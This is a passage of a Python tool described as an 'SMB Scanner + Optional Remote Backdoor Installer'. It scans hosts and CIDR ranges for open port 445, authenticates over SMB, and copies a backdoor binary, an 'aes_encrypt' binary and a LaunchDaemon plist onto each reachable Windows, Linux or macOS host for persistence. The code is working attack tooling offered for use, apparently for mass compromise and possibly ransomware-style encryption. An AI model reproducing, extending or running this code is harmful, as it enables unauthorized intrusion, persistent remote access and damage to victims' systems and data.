        print(f"[!] Failed to load private key '{private_key_path}': {e}", file=sys.stderr)
        return False

    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception as e:
        print(f"[!] Failed to load server public key '{server_public_key_path}': {e}", file=sys.stderr)
        return False

    # 2) Build and sign payload
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)

    # 3) Connect to SMB
    try:
        conn = Connection(
            uuid=str(random.getrandbits(128)),
            is_direct_tcp=True,
            hostname=host,
            port=445
        )
        conn.connect(timeout=5)
    except Exception as e:
        print(f"[!] Could not connect to {host}:445: {e}", file=sys.stderr)
        return False

    # 4) Authenticate
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception as e:
        print(f"[!] Authentication to {host} failed: {e}", file=sys.stderr)
        conn.disconnect()
        return False

    # 5) Verify server’s signature
    try:
        serv_pub.verify(
            signature,
            payload_bytes,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
    except Exception:
        print(f"[!] Server signature verification failed for {host}. Aborting install.", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 6) Tree-connect to share (must map to "/" or an equivalent root)
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception as e:
        print(f"[!] TreeConnect to {share} on {host} failed: {e}", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 7) Copy AES binary to /usr/local/bin/aes_encrypt
    aes_name = "aes_encrypt"
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"[!] Cannot read local AES binary '{aes_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_aes = f"usr/local/bin/{aes_name}"
        aes_file = Open(
            tree,
            dest_aes,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception as e:
        print(f"[!] Failed to copy AES binary to {host}: /usr/local/bin/{aes_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 8) Make it executable (if Samba honors perms; many do if configured)
    try:
        aes_attrs = Open(
            tree,
            dest_aes,
            access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            disposition=CreateDisposition.FILE_OPEN,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        aes_attrs.create(timeout=5)
        aes_attrs.close()
    except Exception:
        pass

    # 9) Copy backdoor binary to /usr/local/bin/backdoor
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception as e:
        print(f"[!] Cannot read local backdoor binary '{backdoor_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_bd = f"usr/local/bin/{backdoor_name}"
        bd_file = Open(
            tree,
            dest_bd,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception as e:
        print(f"[!] Failed to copy backdoor to {host}: /usr/local/bin/{backdoor_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 10) Make it executable
    try:
        bd_attrs = Open(
            tree,
            dest_bd,
            access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            disposition=CreateDisposition.FILE_OPEN,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass

    # 11) Copy LaunchDaemon plist to /Library/LaunchDaemons/com.example.backdoor.plist
    plist_name = os.path.basename(backdoor_plist_path)
    try:
        with open(backdoor_plist_path, "rb") as f:
            data3 = f.read()
    except Exception as e:
        print(f"[!] Cannot read local plist '{backdoor_plist_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_plist = f"Library/LaunchDaemons/{plist_name}"
        plist_file = Open(
            tree,
            dest_plist,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        plist_file.create(timeout=5)
        plist_file.write(data3, 0)
        plist_file.close()
    except Exception as e:
        print(f"[!] Failed to copy plist to {host}: /Library/LaunchDaemons/{plist_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    print(f"[+] Installed backdoor & AES on {host} (macOS).")
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def parse_args():
    p = argparse.ArgumentParser(
        description="SMB Scanner + Optional Remote Backdoor Installer"
    )
    p.add_argument(
        "--host", action="append", default=[],
        help="Specify one or more hosts to scan/install. May be repeated."
    )
    p.add_argument(
        "--cidr", action="append", default=[],
        help="Specify one or more CIDR ranges to scan. May be repeated."
    )
    p.add_argument(
        "--input", help="File with newline‐separated hostnames/IPs."
    )
    p.add_argument(
        "--timeout", type=int, default=2,
        help="Connection timeout in seconds."
    )
    p.add_argument(
        "--workers", type=int, default=100,
        help="Number of parallel scanning threads."
    )
    p.add_argument(
        "--json", action="store_true",
        help="Only output JSON of successful routes."
    )
    p.add_argument(
        "--allowlist", help="Optional JSON file with allowlist of IPs/CIDRs."
    )
    p.add_argument(
        "--strategy", choices=[
            "round", "mcts", "weighted", "anneal", "genetic", "hill", "combo"
        ], default="combo",
        help="Target ordering strategy for scanning."
    )
    p.add_argument(
        "--save", help="Save successful routes to this JSON file."
    )
    p.add_argument(
        "--reload", help="Reload previous scan results from this JSON file."
    )
    p.add_argument(
        "--asyncio", action="store_true",
        help="Use asyncio for parallel scanning."
    )
    p.add_argument(
        "--no-generalize", action="store_false", dest="generalize",
        help="Report specific IPs instead of 0.0.0.0/0 or ::/0."
    )
    p.add_argument(
        "--quiet", action="store_true",
        help="Suppress debug logs."
    )

    # ─── NEW: Backdoor installation flags ───
    p.add_argument(
        "--install-backdoor", action="store_true",
        help="If set, install backdoor on hosts that responded on SMB (port 445)."
    )
    p.add_argument(
        "--remote-os",
        choices=["windows", "linux", "macos"],
        help="Remote OS type (windows, linux, macos). Required if --install-backdoor."
    )
    p.add_argument(
        "--share",
        help="Samba share name for Linux/macOS (maps to /). Not needed for Windows (uses C$)."
    )
    p.add_argument(
        "--key", help="Path to RSA-2048 private key (PEM)."
    )
    p.add_argument(
        "--server-pubkey", help="Path to server’s RSA-2048 public key (PEM)."
    )
    p.add_argument(
        "--username", help="SMB username."
    )
    p.add_argument(
        "--password", help="SMB password (or empty if using Kerberos)."
    )
    p.add_argument(
        "--domain", default="", help="SMB domain (optional)."
    )
    p.add_argument(
        "--use-kerberos", action="store_true",
        help="Use Kerberos for SMB session rather than NTLMv2."
    )
    p.add_argument(
        "--aes-binary", help="Local path to the AES encryptor binary (compiled)."
    )
    p.add_argument(
        "--backdoor-binary", help="Local path to the backdoor binary/executable."
    )
    p.add_argument(
        "--backdoor-script", help="Local path to the Linux init script (shell)."
    )
    p.add_argument(
        "--backdoor-plist", help="Local path to the macOS LaunchDaemon plist."
    )

    p.set_defaults(generalize=True)
    return p.parse_args()

def main():
    a = parse_args()
    s = PublicIPFirewallSMB(
        allowlist=a.allowlist,
        strategy=a.strategy,
        timeout=a.timeout,
        workers=a.workers,
        generalize=a.generalize,
        verbose=not a.quiet
    )

    # Build initial host list
    hosts = a.host or []
    if a.input:
        with open(a.input) as f:
            hosts.extend(l.strip() for l in f if l.strip())
    cidrs = a.cidr or []

    # Optionally reload previous results
    if a.reload:
        d = s.load_routes(a.reload)
        if d:
            for r in d:
                x = r.get("details", {}).get("host") or r.get("host")
                if x and x not in hosts:
                    hosts.append(x)

    # If no hosts or CIDRs provided, default to allowlist IPs/CIDRs
    if not hosts and not cidrs:
        hosts = [str(x) for x in s._ips]
        cidrs = [str(n) for n in s._nets]

    # 1) Perform the scan
    s.scan(hosts, cidrs, async_mode=a.asyncio)

    if a.save or a.reload:
        s.save_routes(a.save or a.reload)

    ok = s.successful_routes()

    if a.json:
        print(json.dumps(ok, indent=2))
    else:
        for r in ok:
            print(f"{r['host']}:{r['port']} open")

    # ─── NEW: If --install-backdoor was specified, attempt to install backdoor on each discovered host. ───
    if a.install_backdoor:
        # Validate mandatory backdoor arguments
        missing = []
        if a.remote_os is None:
            missing.append("--remote-os")
        if a.key is None:
            missing.append("--key")
        if a.server_pubkey is None:
            missing.append("--server-pubkey")
        if a.username is None:
            missing.append("--username")
        # Password may be blank if using Kerberos, but pass empty string is OK
        if a.remote_os in ("linux", "macos") and a.share is None:
            missing.append("--share (for linux/macOS)")
        if a.aes_binary is None:
            missing.append("--aes-binary")
        if a.backdoor_binary is None:
            missing.append("--backdoor-binary")
        if a.remote_os == "linux" and a.backdoor_script is None:
            missing.append("--backdoor-script (for linux)")
        if a.remote_os == "macos" and a.backdoor_plist is None:
            missing.append("--backdoor-plist (for macos)")

        if missing:
            print("[ERROR] Missing required arguments for --install-backdoor: " +
                  ", ".join(missing), file=sys.stderr)
            sys.exit(1)

        for route in ok:
            host = route["host"]
            print(f"[*] Installing backdoor on {host} [{a.remote_os}] ...")
            success = False
            if a.remote_os == "windows":
                success = install_backdoor_windows(
                    host=host,
                    username=a.username,
                    password=a.password or "",
                    private_key_path=a.key,
                    server_public_key_path=a.server_pubkey,
                    aes_binary_path=a.aes_binary,
                    backdoor_binary_path=a.backdoor_binary,
                    domain=a.domain,
                    use_kerberos=a.use_kerberos
                )
            elif a.remote_os == "linux":
                success = install_backdoor_linux(
                    host=host,
                    share=a.share,
                    username=a.username,
                    password=a.password or "",
                    private_key_path=a.key,
                    server_public_key_path=a.server_pubkey,
                    aes_binary_path=a.aes_binary,
                    backdoor_binary_path=a.backdoor_binary,
                    backdoor_script_path=a.backdoor_script
                )
            elif a.remote_os == "macos":
                success = install_backdoor_macos(
                    host=host,
                    share=a.share,
                    username=a.username,
                    password=a.password or "",
                    private_key_path=a.key,
                    server_public_key_path=a.server_pubkey,
                    aes_binary_path=a.aes_binary,
                    backdoor_binary_path=a.backdoor_binary,
                    backdoor_plist_path=a.backdoor_plist
                )
            else:
                print(f"[!] Unsupported remote OS: {a.remote_os}", file=sys.stderr)

            if not success:
                print(f"[!] Backdoor installation failed for {host}", file=sys.stderr)
            else:
                print(f"[+] Backdoor installation succeeded for {host}")

if __name__ == "__main__":
    main()
